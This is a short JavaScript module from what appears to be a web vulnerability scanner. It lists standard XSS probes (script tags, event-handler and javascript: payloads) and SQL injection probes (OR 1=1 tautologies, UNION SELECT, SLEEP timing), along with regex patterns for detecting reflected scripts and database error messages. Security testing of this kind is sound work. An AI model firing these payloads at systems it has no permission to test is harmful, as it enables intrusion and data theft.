export const PAYLOADS = {
  xss: [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "';alert('XSS');//",
    "<img src=x onerror=\"alert('XSS')\">",
    "<svg onload=\"alert('XSS')\">",
    'javascript:alert("XSS")',
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<body onload=\"alert('XSS')\">",
  ],
  sqli: [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1/*",
    "admin' --",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
    "1' AND SLEEP(5)--",
    "' AND 1=1--",
  ],
  csrf: [
    // CSRF detection is based on form analysis, not payload injection
  ],
}

export const XSS_DETECTION_PATTERNS = [/<script[^>]*>.*?<\/script>/gi, /on\w+\s*=/gi, /javascript:/gi, /eval\(/gi]

export const SQLI_ERROR_PATTERNS = [
  /SQL syntax/gi,
  /mysql_fetch/gi,
  /Warning.*mysql/gi,
  /ORA-\d+/gi,
  /PostgreSQL.*ERROR/gi,
  /SQLServer.*error/gi,
  /Syntax error/gi,
]

export const SQLI_BOOLEAN_PATTERNS = [/true|false/gi, /yes|no/gi, /on|off/gi]
